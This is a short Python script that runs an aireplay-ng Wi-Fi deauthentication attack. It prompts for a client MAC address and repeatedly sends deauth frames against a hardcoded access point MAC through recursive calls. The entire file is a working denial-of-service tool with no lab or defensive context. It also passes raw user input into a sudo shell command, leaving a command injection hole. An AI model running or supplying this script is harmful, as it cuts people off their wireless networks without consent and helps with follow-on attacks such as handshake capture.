import os
def start():
    a=input("Enter Station Mac addr.  : ");
    os.system("sudo aireplay-ng --deauth 10 -a D6:B7:09:E0:DD:76 -c '"+a+"' wlx0036765536d1");
    start()
start()
